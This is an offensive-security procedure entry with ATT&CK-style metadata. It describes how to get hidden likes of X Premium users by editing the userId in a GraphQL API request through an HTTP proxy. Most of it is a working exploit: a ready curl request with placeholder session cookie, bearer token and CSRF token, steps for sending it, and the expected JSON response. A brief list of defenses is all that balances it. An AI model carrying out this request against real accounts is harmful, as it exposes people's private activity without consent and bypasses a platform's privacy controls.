---
id: proc-2140960-002
tags:
  - graphql
  - proxy-modify
  - access-bypass
  - data-retrieval
type: procedure
tools:
  - '[[tools/HTTP-Proxy]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-graphql-likes-retrieve]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:35.351Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
---
# Modify-and-Send-Proxy-Request-for-Hidden-Likes

## Summary

This procedure modifies a prepared GraphQL API request in an HTTP proxy to target a specific X Premium user's ID and sends it to retrieve their hidden likes, bypassing UI privacy controls.

## Description

The X GraphQL API endpoint for likes lacks enforcement of hidden likes privacy for Premium users, allowing authenticated sessions to query any user's data directly. By altering the userId in the URL-encoded variables and sending via proxy, attackers can expose private like activity in JSON format. This targets web-based API over HTTP/2 and requires an active X authentication.

## Requirements

1. Prepared raw HTTP request from prior procedure
2. HTTP proxy tool (e.g., Burp Suite) for interception and modification
3. Target user's X ID (e.g., obtained from profile URL)
4. Valid X authentication headers

## Defense

Defensive measures and detection strategies:

- Enforce owner-only access in GraphQL resolvers for like queries
- Log and alert on cross-user like queries from authenticated sessions
- Use input validation to restrict userId to session owner

## Objectives

1. Update request to query target user's hidden likes
2. Execute request to collect private data
3. Validate exposure of UI-hidden information

## Instructions

### Step 1: Load and Modify Request in Proxy

**Context**: Paste the raw request into the proxy's Repeater or similar tool and update the userId variable.

Use [[commands/curl-graphql-likes-retrieve]] as an equivalent for testing outside proxy:

```bash
curl -X GET "https://twitter.com/i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%5C%22userId%5C%22%3A%5C%221234567890%5C%22%2C%5C%22count%5C%22%3A20%2C%5C%22includePromotedContent%5C%22%3Atrue%7D&features=%7B%5C%22hiddenLikesEnabled%5C%22%3Atrue%7D" -H "Cookie: your_session_cookie" -H "Authorization: Bearer your_bearer_token" -H "X-Csrf-Token: your_csrf" -H "User-Agent: Mozilla/5.0..."
```

> Replace placeholders with actual values. This modifies variables to target userId '1234567890'. Expected output: No errors, request ready to send.

### Step 2: Send Modified Request

**Context**: Transmit the request via proxy or curl to fetch the data.

Execute the curl command above or forward in proxy.

> Upon success, the response is JSON with 'data' > 'user' > 'result' > 'timeline_v2' containing tweet objects from hidden likes. Verify by checking the target's profile UI shows no likes visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-likes-retrieve]]

## Tools Used

- [[tools/HTTP-Proxy]]

## Tags

- [[graphql]]
- [[proxy-modify]]
- [[access-bypass]]
